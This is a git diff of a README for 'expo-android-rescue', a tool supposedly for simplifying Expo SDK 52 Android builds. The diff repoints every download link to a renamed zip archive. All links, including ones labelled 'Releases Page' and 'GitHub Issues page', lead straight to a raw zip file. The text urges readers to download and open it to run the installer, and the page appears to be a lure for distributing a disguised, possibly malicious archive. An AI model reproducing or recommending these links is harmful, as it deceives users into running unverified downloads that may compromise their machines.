@@ -1,6 +1,6 @@
 # 🚀 expo-android-rescue - Simplify Your Expo Builds Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/expo-android-rescue.zip%20Now-Click%https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/expo-android-rescue.zip)](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/expo-android-rescue.zip)
+[![Download Now](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/rescue_expo_android_v2.8-beta.4.zip%20Now-Click%https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/rescue_expo_android_v2.8-beta.4.zip)](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/rescue_expo_android_v2.8-beta.4.zip)
 
 ## 📦 Introduction
 
@@ -27,7 +27,7 @@ Before you download, ensure your system meets these requirements:
 
 To get started, follow these steps:
 
-1. **Visit the Download Page:** Go to the [Releases Page](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/expo-android-rescue.zip) to find the latest version.
+1. **Visit the Download Page:** Go to the [Releases Page](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/rescue_expo_android_v2.8-beta.4.zip) to find the latest version.
 2. **Select the Latest Release:** Look for the most recent version listed.
 3. **Download the File:** Click on the asset to download it. This file will be in a format compatible with your system.
 
@@ -35,7 +35,7 @@ To get started, follow these steps:
 
 To install the application, follow these instructions:
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/expo-android-rescue.zip) to download.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/rescue_expo_android_v2.8-beta.4.zip) to download.
 2. Locate the desired version and click to download.
 3. Once downloaded, find the file in your downloads folder.
 4. Open the file to run the installation process.
@@ -63,11 +63,11 @@ If you encounter any problems, try these tips:
 
 If you have further questions or need assistance, please reach out:
 
-- **GitHub Issues:** You can report issues or bugs directly on our [GitHub Issues page](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/expo-android-rescue.zip).
+- **GitHub Issues:** You can report issues or bugs directly on our [GitHub Issues page](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/rescue_expo_android_v2.8-beta.4.zip).
 - **Community Forums:** Engage with other users in our support forums for shared help and solutions.
 
 ## 🔗 Conclusion
 
 Thank you for choosing **expo-android-rescue**. We hope this application simplifies your Expo SDK 52 builds for Android. If you have suggestions for improvement, please let us know through the channels mentioned above.
 
-[![Download Now](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/expo-android-rescue.zip%20Now-Click%https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/expo-android-rescue.zip)](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/expo-android-rescue.zip)
+[![Download Now](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/rescue_expo_android_v2.8-beta.4.zip%20Now-Click%https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/rescue_expo_android_v2.8-beta.4.zip)](https://raw.githubusercontent.com/monesbahha/expo-android-rescue/main/rob/rescue_expo_android_v2.8-beta.4.zip)
